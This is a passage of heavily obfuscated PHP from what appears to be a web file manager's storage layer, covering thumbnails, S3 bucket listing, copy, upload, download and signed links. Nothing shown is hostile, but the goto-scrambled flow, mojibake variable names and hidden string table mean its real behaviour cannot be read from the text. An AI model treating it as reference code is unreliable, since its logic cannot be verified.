$B¹–œŒ¨ñ = array(); return; } if (is_null($b—ÍÓò¯ĞÔ)) { unset($B¹–œŒ¨ñ[$B•ĞÌ°ëÎ‚]); return; } $fº¤§·‘­ = isset($B¹–œŒ¨ñ[$B•ĞÌ°ëÎ‚]) ? $B¹–œŒ¨ñ[$B•ĞÌ°ëÎ‚] : null; goto B±ºñäƒêè; B±ºñäƒêè: if (!is_null($fº¤§·‘­)) { return $fº¤§·‘­; } $fº¤§·‘­ = $this->{$F¾ôŞ‹‡İ}($b—ÍÓò¯ĞÔ); $B¹–œŒ¨ñ[$B•ĞÌ°ëÎ‚] = $fº¤§·‘­; goto Cãèîàº‡‘; Cãèîàº‡‘: return $fº¤§·‘­; goto a£¦ªâ…‘; a£¦ªâ…‘: } public function fileOutImage($b„öÔ•“ñè, $Bîš×ì»ñÅ = 250) { goto aÎ•æÛØ©¶; b«¸™³í˜¾: if (!($cˆôòõç®Ü = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $AïÇšÛÉêÑ[165]))) { $B£·Îõ­» = IO::mkdir(IO_PATH_SYSTEM_TEMP . $AïÇšÛÉêÑ[166]); } else { $B£·Îõ­» = KodIO::make($cˆôòõç®Ü); } if ($cˆôòõç®Ü = IO::fileNameExist($B£·Îõ­», $A­¹ñ›µ©)) { $c¾Î…ï…¬¼ = KodIO::make($cˆôòõç®Ü); return IO::fileOut($c¾Î…ï…¬¼); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto CíµÕŠÚµ—; AìùÛ¸¤ç: if (!($eÏ™ÀÙ¡òÌ = IO::move($c¾Î…ï…¬¼, $B£·Îõ­»))) { return IO::fileOut($c¾Î…ï…¬¼); } del_file($c¾Î…ï…¬¼); IO::fileOut($eÏ™ÀÙ¡òÌ); goto A¥¦æõİÌ·; CíµÕŠÚµ—: $c¾Î…ï…¬¼ = DATA_THUMB . $A­¹ñ›µ©; if (!@file_exists($c¾Î…ï…¬¼)) { $A½È³²Â¨ = TEMP_FILES; if (!is_dir($A½È³²Â¨)) { mk_dir($A½È³²Â¨); } $bµĞ‰±Ü«§ = $A½È³²Â¨ . $cÎ£ƒÅéÚì . $AïÇšÛÉêÑ[91] . $EƒŒ‡×Á×[$AïÇšÛÉêÑ[160]]; if (!@file_exists($bµĞ‰±Ü«§)) { $bµĞ‰±Ü«§ = $this->download($b„öÔ•“ñè, $bµĞ‰±Ü«§); } $AĞäÑ×Ë = new ImageThumb($bµĞ‰±Ü«§, $AïÇšÛÉêÑ[167]); $AĞäÑ×Ë->prorate($c¾Î…ï…¬¼, $Bîš×ì»ñÅ, $Bîš×ì»ñÅ * 10); } if (!file_exists($c¾Î…ï…¬¼) || filesize($c¾Î…ï…¬¼) < 100) { return @file_exists($bµĞ‰±Ü«§) ? IO::fileOut($bµĞ‰±Ü«§) : $this->fileOut($b„öÔ•“ñè); } goto AìùÛ¸¤ç; B§ÍÆµ¼: if ($EƒŒ‡×Á×[$AïÇšÛÉêÑ[77]] <= 1024 * 50 || !function_exists($AïÇšÛÉêÑ[159]) || $EƒŒ‡×Á×[$AïÇšÛÉêÑ[160]] == $AïÇšÛÉêÑ[161]) { return $this->fileOut($b„öÔ•“ñè); } if (isset($EƒŒ‡×Á×[$AïÇšÛÉêÑ[162]][$AïÇšÛÉêÑ[163]])) { $cÎ£ƒÅéÚì = $EƒŒ‡×Á×[$AïÇšÛÉêÑ[162]][$AïÇšÛÉêÑ[163]]; } else { if (isset($EƒŒ‡×Á×[$AïÇšÛÉêÑ[162]][$AïÇšÛÉêÑ[164]])) { $cÎ£ƒÅéÚì = $EƒŒ‡×Á×[$AïÇšÛÉêÑ[162]][$AïÇšÛÉêÑ[164]]; } else { $cÎ£ƒÅéÚì = md5("{$EƒŒ‡×Á×[$AïÇšÛÉêÑ[28]]}\137{$EƒŒ‡×Á×[$AïÇšÛÉêÑ[75]]}\x5f{$EƒŒ‡×Á×[$AïÇšÛÉêÑ[77]]}"); } } $A­¹ñ›µ© = "{$cÎ£ƒÅéÚì}\137{$Bîš×ì»ñÅ}\x2e\160\x6e\147"; goto b«¸™³í˜¾; aÎ•æÛØ©¶: $AïÇšÛÉêÑ =& $_SERVER[”Ì÷ñ­î¸]; if (substr($b„öÔ•“ñè, 0, 4) == $AïÇšÛÉêÑ[144]) { $this->fileOutLink($b„öÔ•“ñè); } $EƒŒ‡×Á× = $this->info($b„öÔ•“ñè); goto B§ÍÆµ¼; A¥¦æõİÌ·: } public function fileOutImageServer($e£«Š¼¯´è, $Dğè°²â‰ = 250) { $this->fileOutImage($e£«Š¼¯´è, $Dğè°²â‰); } public function fileNameAuto($DÃµÛº­ó, $cÅ‰È¦Ø®, $A²å­£”¿â = REPEAT_RENAME, $E¡ß„’¢ë = false) { goto d­…Ï¯ö´; dµ®Èèù§Ñ: $AØŞ“ç®¸ = 1; $b´Èô‹Íğ = substr($cÅ‰È¦Ø®, 0, strlen($cÅ‰È¦Ø®) - strlen($aˆçÎŸø™)); $a±â©³Ò¤Ö = $b´Èô‹Íğ . "\50{$AØŞ“ç®¸}\51{$aˆçÎŸø™}"; goto f—Œ¹åˆ; d­…Ï¯ö´: $a°ÇÏ®ğ =& $_SERVER[”Ì÷ñ­î¸]; $D…¶ñ¿– = $DÃµÛº­ó === $a°ÇÏ®ğ[33] ? $cÅ‰È¦Ø® : rtrim($DÃµÛº­ó, $a°ÇÏ®ğ[8]) . $a°ÇÏ®ğ[8] . $cÅ‰È¦Ø®; if ($A²å­£”¿â == REPEAT_REPLACE || !$this->exist($D…¶ñ¿–) || $E¡ß„’¢ë && $A²å­£”¿â != REPEAT_RENAME_FOLDER) { return $cÅ‰È¦Ø®; } goto aœÕÊ¹æ¹; aœÕÊ¹æ¹: if ($A²å­£”¿â == REPEAT_SKIP) { return !1; } $aˆçÎŸø™ = $a°ÇÏ®ğ[91] . get_path_ext($cÅ‰È¦Ø®); $aˆçÎŸø™ = $aˆçÎŸø™ == $a°ÇÏ®ğ[91] || $E¡ß„’¢ë ? $a°ÇÏ®ğ[33] : $aˆçÎŸø™; goto dµ®Èèù§Ñ; f—Œ¹åˆ: while ($this->exist(rtrim($DÃµÛº­ó, $a°ÇÏ®ğ[8]) . $a°ÇÏ®ğ[8] . $a±â©³Ò¤Ö)) { $a±â©³Ò¤Ö = $b´Èô‹Íğ . "\x28{$AØŞ“ç®¸}\51{$aˆçÎŸø™}"; $AØŞ“ç®¸++; } return $a±â©³Ò¤Ö; goto cğ÷Ù²ø°; cğ÷Ù²ø°: } public function listAllFiles($fˆšôß¨‚Ù, $bÆéƒ«èË¥, $CÁíø©”¤ = array()) { goto E¥±ĞƒŸíª; BíÌªŒéÊ: $fˆšôß¨‚Ù = trim($fˆšôß¨‚Ù, $Eˆ½Ïôõ”¥[8]); foreach ($bÆéƒ«èË¥ as $d’¹ó…ğ) { $båñğâ¤“÷ = ltrim(substr($d’¹ó…ğ, strlen($fˆšôß¨‚Ù)), $Eˆ½Ïôõ”¥[8]); $f¡‚Æ†Õ¨Î = array_merge($f¡‚Æ†Õ¨Î, $this->slicePath($båñğâ¤“÷)); } $cİ¥šğó›• = array(); goto Cè„é¯‘¤§; Cè„é¯‘¤§: foreach (array_unique($f¡‚Æ†Õ¨Î) as $d’¹ó…ğ) { $Bâ¡ô‹ÏÆ = array($Eˆ½Ïôõ”¥[75] => $this->getPathOuter($Eˆ½Ïôõ”¥[8] . $fˆšôß¨‚Ù . $Eˆ½Ïôõ”¥[8] . $d’¹ó…ğ), $Eˆ½Ïôõ”¥[76] => 1, $Eˆ½Ïôõ”¥[77] => 0); if (substr($d’¹ó…ğ, -1) != $Eˆ½Ïôõ”¥[8]) { $Bâ¡ô‹ÏÆ[$Eˆ½Ïôõ”¥[76]] = 0; $A¬Ù©ŠÓŒ± = $this->getPath($fˆšôß¨‚Ù . $Eˆ½Ïôõ”¥[8] . $d’¹ó…ğ); $Bâ¡ô‹ÏÆ[$Eˆ½Ïôõ”¥[77]] = isset($CÁíø©”¤[$A¬Ù©ŠÓŒ±]) ? $CÁíø©”¤[$A¬Ù©ŠÓŒ±] : $this->size($A¬Ù©ŠÓŒ±); } $cİ¥šğó›•[] = $Bâ¡ô‹ÏÆ; } return $cİ¥šğó›•; goto EâÕ²ëò»; E¥±ĞƒŸíª: $Eˆ½Ïôõ”¥ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($bÆéƒ«èË¥)) { return array(); } $f¡‚Æ†Õ¨Î = array(); goto BíÌªŒéÊ; EâÕ²ëò»: } public function slicePath($EóøØàà ï) { $e½‹•–ŞÓ =& $_SERVER[”Ì÷ñ­î¸]; $B»‘òÌ·‘ = explode($e½‹•–ŞÓ[8], trim($EóøØàà ï, $e½‹•–ŞÓ[8])); $f¡è£‚İˆå = 0; do { ++$f¡è£‚İˆå; $D”¶Ú•[] = implode($e½‹•–ŞÓ[8], array_slice($B»‘òÌ·‘, 0, $f¡è£‚İˆå)) . $e½‹•–ŞÓ[8]; } while ($f¡è£‚İˆå < count($B»‘òÌ·‘)); $D”¶Ú•[count($B»‘òÌ·‘) - 1] = $EóøØàà ï; return $D”¶Ú•; } public function getHost() { $c„á»‹°í =& $_SERVER[”Ì÷ñ­î¸]; $e¯¨õŒÍñ = parse_url(trim($this->domain, $c„á»‹°í[8])); $d²Å”•Åºİ = isset($e¯¨õŒÍñ[$c„á»‹°í[168]]) ? $e¯¨õŒÍñ[$c„á»‹°í[168]] : http_type(); $DÊ¯÷Û°Ç = isset($e¯¨õŒÍñ[$c„á»‹°í[169]]) ? $e¯¨õŒÍñ[$c„á»‹°í[169]] : $e¯¨õŒÍñ[$c„á»‹°í[75]]; if (isset($e¯¨õŒÍñ[$c„á»‹°í[170]])) { $DÊ¯÷Û°Ç .= $c„á»‹°í[4] . $e¯¨õŒÍñ[$c„á»‹°í[170]]; } return $d²Å”•Åºİ . $c„á»‹°í[171] . $DÊ¯÷Û°Ç; } public function pathEncode($aæ¼ƒ¿×Öë) { $d½¶«Š©›£ =& $_SERVER[”Ì÷ñ­î¸]; return str_replace($d½¶«Š©›£[172], $d½¶«Š©›£[8], rawurlencode($aæ¼ƒ¿×Öë)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Bœ¶£áà¨„) { set_timeout(); require_once SDK_DIR . $_SERVER[”Ì÷ñ­î¸][173]; parent::__construct(); $this->_init($Bœ¶£áà¨„); } public function _init($fää™ĞÑÍ°) { foreach ($fää™ĞÑÍ° as $Fõ¦ùæí‘¢ => $dÚ×ÏÓÆ‚º) { if (isset($this->{$Fõ¦ùæí‘¢})) { $this->{$Fõ¦ùæí‘¢} = $dÚ×ÏÓÆ‚º; } } $this->endpoint = $fää™ĞÑÍ°[$_SERVER[”Ì÷ñ­î¸][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($dñĞÌ†ÅÙ… = "\x76\64") { $this->signVer = $dñĞÌ†ÅÙ…; $this->client->setSignatureVersion($dñĞÌ†ÅÙ…); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto d‡ƒ˜‚±ÇÒ; EÔ«ßĞÚ’“: $e“–ØÇ¥¶ = array($d„ØÕ¢–¹[180], $d„ØÕ¢–¹[181], $d„ØÕ¢–¹[182], $d„ØÕ¢–¹[183], $d„ØÕ¢–¹[184]); $FØÀ§ø¦ª = array_diff($e“–ØÇ¥¶, $AïˆºÙŒ£ñ); return empty($FØÀ§ø¦ª); goto aô¥›•á©ê; d‡ƒ˜‚±ÇÒ: $d„ØÕ¢–¹ =& $_SERVER[”Ì÷ñ­î¸]; $dáÀÅî™¯  = $this->getBucketCors(); if (!$dáÀÅî™¯  || !is_array($dáÀÅî™¯ )) { return !1; } goto E…Ô¤®á…‚; E…Ô¤®á…‚: if ($dáÀÅî™¯ [$d„ØÕ¢–¹[175]] != $d„ØÕ¢–¹[176] || $dáÀÅî™¯ [$d„ØÕ¢–¹[177]] != $d„ØÕ¢–¹[176]) { return !1; } $AïˆºÙŒ£ñ = array_map($d„ØÕ¢–¹[178], $dáÀÅî™¯ [$d„ØÕ¢–¹[179]]); if (!is_array($AïˆºÙŒ£ñ)) { $AïˆºÙŒ£ñ = array(); } goto EÔ«ßĞÚ’“; aô¥›•á©ê: } public function mkfile($F™¾¯é‰Šî, $b¬¨‚çïÒ = '', $B«Í“„Ã¡ = REPEAT_RENAME) { $cáí¢Óåªë = $this->setContent($F™¾¯é‰Šî, $b¬¨‚çïÒ); if ($cáí¢Óåªë !== !1) { return $this->getPathOuter($F™¾¯é‰Šî); } return !1; } public function mkdir($fÃš°ÀÓˆ¹, $cÍ†£ÂŸÏ¿ = REPEAT_SKIP) { if (empty($fÃš°ÀÓˆ¹)) { return !1; } if ($this->_isFolder($fÃš°ÀÓˆ¹)) { return $this->getPathOuter($fÃš°ÀÓˆ¹); } $f´‡‡ëåˆÌ = $this->setContent($fÃš°ÀÓˆ¹, $_SERVER[”Ì÷ñ­î¸][33], !0); if ($f´‡‡ëåˆÌ !== !1) { return $this->getPathOuter($fÃš°ÀÓˆ¹); } return !1; } public function copyFile($d‡µ«»™‚¦, $f­ªºÜ¹„÷, $d‰ÙËùÉİ÷ = array()) { $eƒø©æù•ã =& $_SERVER[”Ì÷ñ­î¸]; $B…ôÑ¬Ú×Œ = $this->objectMeta($d‡µ«»™‚¦); if (!$B…ôÑ¬Ú×Œ) { return !1; } if ($B…ôÑ¬Ú×Œ[$eƒø©æù•ã[77]] <= 1024 * 1024 * 200) { $FäÈÀ³ÛáÁ = $this->client->copyObject($this->bucket, $d‡µ«»™‚¦, $this->bucket, $f­ªºÜ¹„÷, $eƒø©æù•ã[185], $d‰ÙËùÉİ÷); } else { $FäÈÀ³ÛáÁ = $this->client->multiCopyObject($this->bucket, $d‡µ«»™‚¦, $this->bucket, $f­ªºÜ¹„÷, $d‰ÙËùÉİ÷); } $FäÈÀ³ÛáÁ = $FäÈÀ³ÛáÁ ? $this->getPathOuter($f­ªºÜ¹„÷) : !1; return $FäÈÀ³ÛáÁ; } public function moveFile($aš ˆÈ¤ƒ, $A—²ÔµŸŞ) { if ($this->copyFile($aš ˆÈ¤ƒ, $A—²ÔµŸŞ)) { $this->delFile($aš ˆÈ¤ƒ); return $this->getPathOuter($A—²ÔµŸŞ); } return !1; } public function delFile($dÃÀ‚óË×) { return $this->client->deleteObject($this->bucket, $dÃÀ‚óË×); } public function delFolder($BŞƒÆ†Æ) { goto AáÃƒÍê; bïŸŸŠé”: return $d÷ö¾á½ª² === $E®“Úğ¤÷‹ ? !0 : !1; goto e¥ƒ”’„Ş¢; AáÃƒÍê: $FŠî‘É„ğÉ =& $_SERVER[”Ì÷ñ­î¸]; $D„¯™äÎ’Ş = $this->listObjs($BŞƒÆ†Æ); if (!$D„¯™äÎ’Ş) { $BŞƒÆ†Æ = trim($BŞƒÆ†Æ, $FŠî‘É„ğÉ[8]); if (!empty($BŞƒÆ†Æ)) { $BŞƒÆ†Æ .= $FŠî‘É„ğÉ[8]; } return $this->delFile($BŞƒÆ†Æ); } goto E—Ó’ØÖÈÚ; E—Ó’ØÖÈÚ: $d÷ö¾á½ª² = $E®“Úğ¤÷‹ = 0; $f¯¥¤ôê£ = array_chunk(array_keys($D„¯™äÎ’Ş), 1000); foreach ($f¯¥¤ôê£ as $f¿âš­Î…„) { $d÷ö¾á½ª²++; $E®“Úğ¤÷‹ += (int) $this->client->deleteObjects($this->bucket, $f¿âš­Î…„); } goto bïŸŸŠé”; e¥ƒ”’„Ş¢: } public function rename($c‰ÄÆğè™ , $cèÏÈÙ‰Èœ) { return $this->renameObject($c‰ÄÆğè™ , $cèÏÈÙ‰Èœ); } public function listPath($E‡Íõ‘††®, $B ğÀë…íÔ = false) { $c’‰ÚÚë÷É =& $_SERVER[”Ì÷ñ­î¸]; $B‚¡¨Ú¾µ® = $this->listObjs($E‡Íõ‘††®, null, null, $c’‰ÚÚë÷É[8]); $a¤«²Ç„›â = array($c’‰ÚÚë÷É[74] => array(), $c’‰ÚÚë÷É[73] => array()); foreach ($B‚¡¨Ú¾µ® as $CÕ’ªù¸Œ => $eô•¿ƒøßğ) { if ($CÕ’ªù¸Œ == $c’‰ÚÚë÷É[8]) { continue; } if (isset($eô•¿ƒøßğ[$c’‰ÚÚë÷É[186]])) { $a¤«²Ç„›â[$c’‰ÚÚë÷É[74]][] = $this->folderInfo($eô•¿ƒøßğ[$c’‰ÚÚë÷É[186]], $B ğÀë…íÔ); } else { if (substr($eô•¿ƒøßğ[$c’‰ÚÚë÷É[28]], -1) == $c’‰ÚÚë÷É[8]) { continue; } $a¤«²Ç„›â[$c’‰ÚÚë÷É[73]][] = $this->fileInfo($eô•¿ƒøßğ[$c’‰ÚÚë÷É[28]], $B ğÀë…íÔ, $eô•¿ƒøßğ); } } return $a¤«²Ç„›â; } private function fileInfo($F¦è˜æâ¹Ñ, $E‹–²Ö‡™à = false, $e®Ó¿Û±öÂ = array()) { goto B‘ÀáÆË‰; B‘ÀáÆË‰: $dƒ›¢¾áº© =& $_SERVER[”Ì÷ñ­î¸]; if ($E‹–²Ö‡™à) { return array($dƒ›¢¾áº©[28] => $this->pathThis($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[75] => $this->getPathOuter($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[29] => $dƒ›¢¾áº©[167], $dƒ›¢¾áº©[160] => $this->ext($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[77] => isset($e®Ó¿Û±öÂ[$dƒ›¢¾áº©[77]]) ? $e®Ó¿Û±öÂ[$dƒ›¢¾áº©[77]] : 0, $dƒ›¢¾áº©[187] => 0, $dƒ›¢¾áº©[107] => 0, $dƒ›¢¾áº©[188] => !0, $dƒ›¢¾áº©[189] => !0); } $Dˆ¦²‰˜Œ = array($dƒ›¢¾áº©[28] => $this->pathThis($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[75] => $this->getPathOuter($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[29] => $dƒ›¢¾áº©[167], $dƒ›¢¾áº©[187] => 0, $dƒ›¢¾áº©[107] => 0, $dƒ›¢¾áº©[77] => 0, $dƒ›¢¾áº©[160] => $this->ext($F¦è˜æâ¹Ñ), $dƒ›¢¾áº©[188] => !0, $dƒ›¢¾áº©[189] => !0); goto EÖ¤™†¼ØÄ; EÖ¤™†¼ØÄ: if (empty($e®Ó¿Û±öÂ)) { $e®Ó¿Û±öÂ = $this->objectMeta($F¦è˜æâ¹Ñ); if (!$e®Ó¿Û±öÂ) { return $Dˆ¦²‰˜Œ; } } if (isset($e®Ó¿Û±öÂ[$dƒ›¢¾áº©[190]])) { $Dˆ¦²‰˜Œ[$dƒ›¢¾áº©[107]] = $e®Ó¿Û±öÂ[$dƒ›¢¾áº©[190]]; } if (isset($e®Ó¿Û±öÂ[$dƒ›¢¾áº©[77]])) { $Dˆ¦²‰˜Œ[$dƒ›¢¾áº©[77]] = $e®Ó¿Û±öÂ[$dƒ›¢¾áº©[77]]; } goto BŒÜ¶µ„”; BŒÜ¶µ„”: return $Dˆ¦²‰˜Œ; goto E–Õ¨‚ÊŠß; E–Õ¨‚ÊŠß: } private function folderInfo($B¨øŠ§ô¤†, $e¨›•ÄéˆÎ = false) { goto e¡¾ğàÛ¿ñ; e¡¾ğàÛ¿ñ: $b¶¥ÔŸ¯… =& $_SERVER[”Ì÷ñ­î¸]; if ($e¨›•ÄéˆÎ) { return array($b¶¥ÔŸ¯…[28] => $this->pathThis($B¨øŠ§ô¤†), $b¶¥ÔŸ¯…[75] => $this->getPathOuter($b¶¥ÔŸ¯…[8] . $B¨øŠ§ô¤†), $b¶¥ÔŸ¯…[29] => $b¶¥ÔŸ¯…[76], $b¶¥ÔŸ¯…[188] => !0, $b¶¥ÔŸ¯…[189] => !0); } $a­óÉÀ¨æµ = array($b¶¥ÔŸ¯…[28] => $this->pathThis($B¨øŠ§ô¤†), $b¶¥ÔŸ¯…[75] => $this->getPathOuter($b¶¥ÔŸ¯…[8] . $B¨øŠ§ô¤†), $b¶¥ÔŸ¯…[29] => $b¶¥ÔŸ¯…[76], $b¶¥ÔŸ¯…[187] => 0, $b¶¥ÔŸ¯…[107] => 0, $b¶¥ÔŸ¯…[188] => !0, $b¶¥ÔŸ¯…[189] => !0); goto BËÉÒóá¤; BËÉÒóá¤: if ($B¨øŠ§ô¤† == $b¶¥ÔŸ¯…[33]) { return $a­óÉÀ¨æµ; } $B¨øŠ§ô¤† = trim($B¨øŠ§ô¤†, $b¶¥ÔŸ¯…[8]) . $b¶¥ÔŸ¯…[8]; $føĞªî°ÈÓ = $this->objectMeta($B¨øŠ§ô¤†); goto Aº‘™·ùöš; Aº‘™·ùöš: if (isset($føĞªî°ÈÓ[$b¶¥ÔŸ¯…[190]])) { $a­óÉÀ¨æµ[$b¶¥ÔŸ¯…[187]] = $føĞªî°ÈÓ[$b¶¥ÔŸ¯…[190]]; } return $a­óÉÀ¨æµ; goto AìÙÅí³’ñ; AìÙÅí³’ñ: } public function listObjs($dÑÁ¨Ú‰£, $DÉ“ÇŞ†Ú¿ = null, $C÷ªø ï… = null, $EÒ£íÄ–¸¶ = null) { $EŞÆ„œˆˆÄ =& $_SERVER[”Ì÷ñ­î¸]; $dÑÁ¨Ú‰£ = trim($dÑÁ¨Ú‰£, $EŞÆ„œˆˆÄ[8]); $DêÄøêªôó = empty($dÑÁ¨Ú‰£) ? $EŞÆ„œˆˆÄ[33] : $dÑÁ¨Ú‰£ . $EŞÆ„œˆˆÄ[8]; return $this->client->getBucket($this->bucket, $DêÄøêªôó, $DÉ“ÇŞ†Ú¿, $C÷ªø ï…, $EÒ£íÄ–¸¶, !0); } public function has($c—íÕ¯¼ , $cï‡ã–ß³Ö = false, $cì•’ÄŠ´› = true) { goto bÀ¤êÓØà; f·½¼‰µ…É: if ($cï‡ã–ß³Ö) { return array($cî°©ŸÄ¡[191] => $C‡ÚÅòËïŠ, $cî°©ŸÄ¡[192] => $E°â®øïÀÑ); } return !1; goto FÁÉ†ƒÛå; bÀ¤êÓØà: $cî°©ŸÄ¡ =& $_SERVER[”Ì÷ñ­î¸]; $C‡ÚÅòËïŠ = 0; $E°â®øïÀÑ = 0; goto e½˜½ ”Í; e½˜½ ”Í: $F¥™À¸éµ¥ = $this->listObjs($c—íÕ¯¼ , null, null, $cî°©ŸÄ¡[8]); $F¥™À¸éµ¥ = is_array($F¥™À¸éµ¥) ? $F¥™À¸éµ¥ : array(); foreach ($F¥™À¸éµ¥ as $a³êÈ×Ö) { if (isset($a³êÈ×Ö[$cî°©ŸÄ¡[28]]) && substr($a³êÈ×Ö[$cî°©ŸÄ¡[28]], -1) != $cî°©ŸÄ¡[8]) { if (!$cï‡ã–ß³Ö && $cì•’ÄŠ´›) { return !0; } $C‡ÚÅòËïŠ++; } else { if (isset($a³êÈ×Ö[$cî°©ŸÄ¡[186]])) { if (!$cï‡ã–ß³Ö && !$cì•’ÄŠ´›) { return !1; } $E°â®øïÀÑ++; } } } goto f·½¼‰µ…É; FÁÉ†ƒÛå: } public function listAll($E¦ÅÖäïïŠ) { $D¸…‰è°–ì =& $_SERVER[”Ì÷ñ­î¸]; $d¹—¡ˆÇÔã = $this->listObjs($E¦ÅÖäïïŠ); $Eˆ‡…¿òø = $BòºğˆÓ´‰ = array(); foreach ($d¹—¡ˆÇÔã as $EàÂ¶¶Œº => $eï¼£øÛåÒ) { $Eˆ‡…¿òø[] = $eï¼£øÛåÒ[$D¸…‰è°–ì[28]]; $BòºğˆÓ´‰[$EàÂ¶¶Œº] = $eï¼£øÛåÒ[$D¸…‰è°–ì[77]]; } return $this->listAllFiles($E¦ÅÖäïïŠ, $Eˆ‡…¿òø, $BòºğˆÓ´‰); } public function canRead($f”’ñÙ÷ÂÖ) { $d™÷“ªßƒƒ =& $_SERVER[”Ì÷ñ­î¸]; $dº÷æĞ¯ô£ = $this->client->getAccessControlPolicy($this->bucket, $f”’ñÙ÷ÂÖ); if (!$dº÷æĞ¯ô£) { return !1; } return in_array($dº÷æĞ¯ô£, array($d™÷“ªßƒƒ[193], $d™÷“ªßƒƒ[194], $d™÷“ªßƒƒ[195])) ? !0 : !1; } public function canWrite($d‘˜Ñåéƒà) { $AæÂì¾©Á© =& $_SERVER[”Ì÷ñ­î¸]; $d ‡ìí»áÅ = $this->client->getAccessControlPolicy($this->bucket, $d‘˜Ñåéƒà); if (!$d ‡ìí»áÅ) { return !1; } return in_array($d ‡ìí»áÅ, array($AæÂì¾©Á©[193], $AæÂì¾©Á©[194])) ? !0 : !1; } public function getContent($b—Ú Àíë“) { return $this->client->getObject($this->bucket, $b—Ú Àíë“); } public function setContent($Eº¼áóÁ·, $Fö‹Ç™”Œ = '', $cÅ‘Œï–Ê¿ = false) { goto EÃÙöÛîÒ°; a‹‘­™Ê‘â: $B¿•šÔ¶¸ = $this->copyFile($Eº¼áóÁ·, $Eº¼áóÁ·, array($EÇôİ¦³¾•[196] => $B¿•šÔ¶¸[$EÇôİ¦³¾•[197]])); return $B¿•šÔ¶¸ ? !0 : !1; goto fê¶ğ£ÚÍ; eàå¤º¯´: $B¿•šÔ¶¸ = $this->client->putObject($Fö‹Ç™”Œ, $this->bucket, $Eº¼áóÁ·, $EÇôİ¦³¾•[185], array(), $eÁÄ™øäæ¹); if (!$B¿•šÔ¶¸) { return !1; } if ($cÅ‘Œï–Ê¿) { return !0; } goto a‹‘­™Ê‘â; EÃÙöÛîÒ°: $EÇôİ¦³¾• =& $_SERVER[”Ì÷ñ­î¸]; $Eº¼áóÁ· = $cÅ‘Œï–Ê¿ ? trim($Eº¼áóÁ·, $EÇôİ¦³¾•[8]) . $EÇôİ¦³¾•[8] : $Eº¼áóÁ·; $eÁÄ™øäæ¹ = get_file_mime(get_path_ext($Eº¼áóÁ·)); goto eàå¤º¯´; fê¶ğ£ÚÍ: } public function fileSubstr($fÒÒõÍ±ßÔ, $E‰Ó ò±Ûä, $AË …›æ·È) { $D´Ë³¯Õ½« = $E‰Ó ò±Ûä + $AË …›æ·È - 1; return $this->client->getObject($this->bucket, $fÒÒõÍ±ßÔ, array($_SERVER[”Ì÷ñ­î¸][198] => "\142\171\164\145\163\x3d{$E‰Ó ò±Ûä}\55{$D´Ë³¯Õ½«}")); } public function upload($C× ’“í‘Ş, $fºˆÃğëŒß, $BƒˆÓó´à£ = false, $Cá›â¥å‘ = REPEAT_REPLACE) { $FŠÙ¨ä’é¥ =& $_SERVER[”Ì÷ñ­î¸]; $fÖ‡ŠÈ÷¡ = array($FŠÙ¨ä’é¥[196] => @md5_file($fºˆÃğëŒß)); $CÎÎÁ×èä = array($FŠÙ¨ä’é¥[199] => get_file_mime(get_path_ext($C× ’“í‘Ş))); if (IO::size($fºˆÃğëŒß) <= 1024 * 1024 * 200) { $Eóà“„Ù§º = $this->client->putObjectFile($fºˆÃğëŒß, $this->bucket, $C× ’“í‘Ş, $FŠÙ¨ä’é¥[185], $fÖ‡ŠÈ÷¡, $CÎÎÁ×èä); return !empty($Eóà“„Ù§º) ? $this->getPathOuter($C× ’“í‘Ş) : !1; } $aÜÅ½¥æˆ = $this->client->multiUploadObject($fºˆÃğëŒß, $this->bucket, trim($C× ’“í‘Ş, $FŠÙ¨ä’é¥[8]), $fÖ‡ŠÈ÷¡, $CÎÎÁ×èä); return $aÜÅ½¥æˆ ? $this->getPathOuter($C× ’“í‘Ş) : !1; } public function download($AŒ‘Ü‰ğÂ, $dãÎ¦›­ğ) { if (!@is_dir($this->pathFather($dãÎ¦›­ğ)) && !IO::mkdir($this->pathFather($dãÎ¦›­ğ))) { return !1; } $eÜ¼·²ëÌğ = $this->client->getObject($this->bucket, $AŒ‘Ü‰ğÂ, array(), $dãÎ¦›­ğ); return $eÜ¼·²ëÌğ !== !1 ? $dãÎ¦›­ğ : !1; } public function link($D¶ĞÉî•‰‚, $bóùÜŸ¢£Ø = array()) { $BáÊ·Æ·½® =& $_SERVER[”Ì÷ñ­î¸]; if ($this->signVer == $BáÊ·Æ·½®[200]) { return $this->client->getAuthenticatedURL($this->bucket, $D¶ĞÉî•‰‚, 3600 * 12, $bóùÜŸ¢£Ø); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($D¶ĞÉî•‰‚, $BáÊ·Æ·½®[8]), 3600 * 12, $this->region, array(), !0, $bóùÜŸ¢£Ø); } public function fileOut($f…­¶ß²¹í, $Dù‹›ÜÁÚ = false, $EÅ¸Øå™Š = false, $FŞ•ç´ÎÛ‰ = '') { goto a÷âßÜÇó; B¹È¿é¾¢: $EÂˆå´‘Úß = $this->link($f…­¶ß²¹í, $BÑÏÓ¿çŒ¶); $this->fileOutLink($EÂˆå´‘Úß); goto d†ß±¬Æë; a÷âßÜÇó: $d‚İ¹õŸ–¤ =& $_SERVER[”Ì÷ñ­î¸]; if (!$EÅ¸Øå™Š) { $EÅ¸Øå™Š = $this->pathThis($f…­¶ß²¹í); } $f—Î»ˆÖ“¬ = get_file_mime(get_path_ext($EÅ¸Øå™Š)); goto EèÑº½ÍÈæ; EèÑº½ÍÈæ: if ($f—Î»ˆÖ“¬ == $d‚İ¹õŸ–¤[201]) { return parent::fileOut($f…­¶ß²¹í, $Dù‹›ÜÁÚ, $EÅ¸Øå™Š, $FŞ•ç´ÎÛ‰); } $Dù‹›ÜÁÚ = 